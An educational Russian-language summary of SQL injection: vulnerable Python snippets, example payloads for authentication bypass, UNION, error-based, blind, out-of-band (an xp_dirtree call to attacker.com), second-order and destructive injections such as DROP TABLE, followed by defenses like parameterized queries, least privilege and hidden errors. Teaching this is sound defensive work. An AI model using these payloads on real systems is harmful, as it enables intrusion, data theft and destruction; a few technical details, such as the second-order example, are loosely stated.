# 📌 **SQL Injection — полный конспект с примерами**

## 1. Что такое SQL Injection?

**SQL Injection (SQLi)** — это тип уязвимости, при котором злоумышленник внедряет произвольный SQL-код в запрос к базе данных через пользовательский ввод.
Если приложение неправильно обрабатывает входные данные, важно, что злоумышленник может:

* читать любые данные,
* изменять или удалять данные,
* обходить авторизацию,
* выполнять административные команды,
* в некоторых СУБД — выполнять системные команды.

---

# 2. Как возникает SQL Injection?

SQLi появляется, когда приложение формирует SQL-запрос при помощи **строчной конкатенации** данных, пришедших от пользователя:

```python
query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
```

Если `username` или `password` не экранируются и не параметризуются, злоумышленник может завершить строковый литерал и добавить свой SQL.

---

# 3. Виды SQL Injection и примеры эксплуатации

## 3.1. Classic / In-band SQL Injection

### (UNION-based, Error-based)

Самые очевидные и «шумные» техники.

---

## 3.1.1. **Classic SQL Injection: логин без пароля**

### Уязвимый код:

```python
username = request["username"]
password = request["password"]

query = f"""
    SELECT * FROM users WHERE username = '{username}' AND password = '{password}'
"""
cursor.execute(query)
```

### Эксплуатация

Пусть злоумышленник вводит:

```
username: admin
password: ' OR '1'='1
```

SQL станет:

```sql
SELECT * FROM users WHERE username = 'admin' AND password = '' OR '1'='1';
```

Выражение `'1'='1'` всегда истинно → авторизация обходится.

### Как закрыть?

1. **Параметризованные запросы (prepared statements)** — главный способ.

Python + psycopg2:

```python
cursor.execute(
    "SELECT * FROM users WHERE username=%s AND password=%s",
    (username, password)
)
```

---

## 3.1.2. **UNION-based injection**

Использует оператор `UNION` для чтения чужих таблиц.

### Уязвимый код (поиск товаров):

```python
q = request["q"]
query = f"SELECT name, price FROM products WHERE name LIKE '%{q}%'"
```

### Атака

Злоумышленник вводит:

```
' UNION SELECT username, password FROM users --
```

Итоговый SQL:

```sql
SELECT name, price FROM products WHERE name LIKE '%'
UNION SELECT username, password FROM users -- %';
```

Результат запроса теперь содержит данные из таблицы `users`.

### Закрытие

* **Параметризация**
* **Whitelist** для сортировки, колонок, операторов
* Запрет `UNION` на уровне WAF

---

## 3.1.3. **Error-based injection**

Когда БД возвращает ошибку, содержащую полезные сведения.

### Уязвимый код:

```python
id = request["id"]
query = f"SELECT * FROM products WHERE id = {id}"
```

### Атака:

```
id = 1 OR (SELECT 1/0)
```

Сервер выдаст ошибку деления на ноль, раскрывая детали БД
(версия Postgres, структура таблиц, типы и т.п.)

### Закрытие

* скрывать SQL-ошибки
* использовать параметризацию
* минимизировать детали ошибок в проде

---

# 3.2. Blind SQL Injection

Сервер не показывает ошибок и не выводит данные, но реагирует на запрос (True/False).

## 3.2.1. Boolean-based blind

Уязвимый код:

```python
id = request["id"]
query = f"SELECT * FROM users WHERE id = {id}"
```

### Атака:

Проверка условия:

```
?id=1 AND (SELECT SUBSTRING(password,1,1)='a')
```

Если результат возвращает запись → условие True.
Если нет — False.
Зависимость ответа позволяет посимвольно вытащить пароль.

### Закрытие

* параметризованные запросы
* ограничение по типам (id должен быть int)
* таймауты и rate limit

---

## 3.2.2. Time-based blind

Использует задержку (`pg_sleep`, `SLEEP`).

### Уязвимый код:

```python
query = f"SELECT * FROM users WHERE id = {user_id}"
```

### Атака:

```
?id=1; SELECT CASE WHEN (SELECT 1 FROM users LIMIT 1) = 1 THEN pg_sleep(5) END;
```

Если сервер «задумается» → условие True.

### Закрытие

* параметризованные запросы
* Web Application Firewall
* ограничение длины и формата входа

---

# 3.3. Out-of-band SQL Injection

Использует сетевые функции БД (например, запрос DNS).

Работает только на определённых СУБД.

### Пример (для MSSQL)

```
'; EXEC master..xp_dirtree '\\attacker.com\share' --
```

Сервер подключается к злоумышленнику → подтверждение инъекции.

---

# 3.4. Second-order Injection

Инъекция хранится в БД и срабатывает позже.

### Пример

1. Пользователь вводит:

```
O'Reilly'); DROP TABLE users; --
```

Сервис экранирует `'`, но **не убирает опасную часть**, и сохраняет строку в БД.

2. Где-то позже приложение формирует SQL:

```python
query = f"UPDATE logs SET last_action = '{user.last_name}'"
```

Теперь входная строка снова становится активной и выполняет `DROP TABLE`.

### Закрытие

* параметризация даже для данных, которые *раньше сами вводил пользователь*
* очистка данных перед сохранением

---

# 4. Эксплуатация SQL Injection в разных случаях

## 4.1. Чтение данных

* `UNION SELECT`
* `ORDER BY`
* Error-based
* Blind techniques

Пример:

```
' UNION SELECT table_name, NULL FROM information_schema.tables --
```

---

## 4.2. Изменение и удаление данных

```
'; UPDATE users SET role='admin' WHERE username='victim'; --
```

```
'; DROP TABLE users; --
```

---

## 4.3. Обход авторизации

```
' OR 1=1 --
```

---

## 4.4. Выполнение файловых/системных команд

Только в некоторых СУБД (MySQL, PostgreSQL с расширениями, MSSQL, Oracle).

Пример (Postgres + extension `adminpack`):

```sql
COPY users TO '/tmp/leak.txt';
```

---

# 5. Как закрыть SQL Injection

Надёжная защита строится из нескольких уровней.

---

## 5.1. **Параметризованные запросы (обязательный минимум)**

Это единственный 100% способ защиты при корректном использовании.

Python + psycopg2:

```python
cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))
```

SQLAlchemy:

```python
session.execute(
    text("SELECT * FROM users WHERE id=:id"), {"id": user_id}
)
```

---

## 5.2. Валидация входных данных

Полезно:

* числовые поля → в `int`
* дата → через `parse`
* ограничение длины строк
* whitelist для полей сортировки, фильтров

```python
assert user_id.isdigit()
```

---

## 5.3. Ограничение прав БД

Если даже SQLi случится — ущерб будет минимален.

* отдельный пользователь БД для фронтенда
* запрет `DROP`, `ALTER`
* запрет `COPY`, `COPY FROM PROGRAM`
* чтение только нужных таблиц

---

## 5.4. Выключить подробные ошибки SQL на проде

Должно быть:

```
500 Internal Server Error  
Something went wrong
```

А не:

```
syntax error at or near "1' OR 1=1"
LINE 2: WHERE username = '1' OR 1=1' AND password=''
```

---

## 5.5. Использовать ORM, когда возможно

ORM сам параметризует запросы.

---

## 5.6. Web Application Firewall (WAF)

Фильтрация опасных кусочков: `' OR`, `' UNION`, `--`, `/*`, `SELECT * FROM`, etc.

---

# 6. Краткое резюме (чеклист)

1. Никогда не формировать SQL через f-строки или конкатенацию.
2. Параметризовать все запросы.
3. Проверять типы (id → int).
4. Прятать ошибки БД.
5. Использовать аккаунт БД с минимальными правами.
6. Защищать фильтры, сортировку и лимиты через whitelist.
7. Использовать ORM там, где это возможно.
8. WAF — дополнительный уровень.
